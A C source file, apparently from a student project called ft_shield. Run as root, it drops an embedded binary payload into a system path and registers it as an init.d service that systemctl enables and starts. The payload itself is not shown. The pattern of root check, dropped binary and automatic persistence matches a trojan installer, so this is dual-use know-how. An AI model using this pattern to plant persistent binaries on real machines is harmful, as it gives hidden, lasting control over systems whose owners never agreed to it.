#include "./inc/ft_shield.h"

static void	create_ft_shield(void)
{
	int fd = open(SHIELD_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd < 0)
		exit (EXIT_FAILURE);

	ssize_t bytes_out = write(fd, __daemon_shield_payload, __daemon_shield_payload_len);
	if (bytes_out < 0)
	{
		close(fd);
		exit (EXIT_FAILURE);
	}
	close(fd);
}

void start_service(void)
{
	int fd = open(SCRIPT_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd < 0)
		exit(EXIT_FAILURE);

	const char *systemv =
		"#!/bin/sh\n"
		"### BEGIN INIT INFO\n"
		"# Provides:          ft_shield\n"
		"# Required-Start:    $local_fs $network\n"
		"# Required-Stop:     $local_fs $network\n"
		"# Default-Start:     2 3 4 5\n"
		"# Default-Stop:      0 1 6\n"
		"# Short-Description: Start and stop ft_shield\n"
		"### END INIT INFO\n"
		"\n"
		"case \"$1\" in\n"
		"  start)\n"
		"    /bin/ft_shield &\n"
		"    ;;\n"
		"  stop)\n"
		"    kill -2 $(pgrep -xo ft_shield)\n"
		"    ;;\n"
		"  status)\n"
		"    if pgrep -xo ft_shield > /dev/null; then\n"
		"      echo \"ft_shield is running\"\n"
		"      exit 0\n"
		"    else\n"
		"      echo \"ft_shield is not running\"\n"
		"      exit 3\n"
		"    fi\n"
		"    ;;\n"
		"  *)\n"
		"    echo \"Usage: $0 {start|stop|status}\"\n"
		"    exit 1\n"
		"    ;;\n"
		"esac\n"
		"\n"
		"exit 0\n";

	ssize_t bytes_out = write(fd, systemv, strlen(systemv));
	if (bytes_out < 0) {
		close(fd);
		exit(EXIT_FAILURE);
	}
	close(fd);
	system("chmod +x /etc/init.d/ft_shield");
	system("systemctl daemon-reload");
	system("systemctl enable ft_shield");
	system("systemctl start ft_shield");
}

int	main()
{
	if (geteuid())
		exit (EXIT_FAILURE);
	create_ft_shield();
	start_service();
	printf("ffarkas-edupless\n");
	return (EXIT_SUCCESS);
}
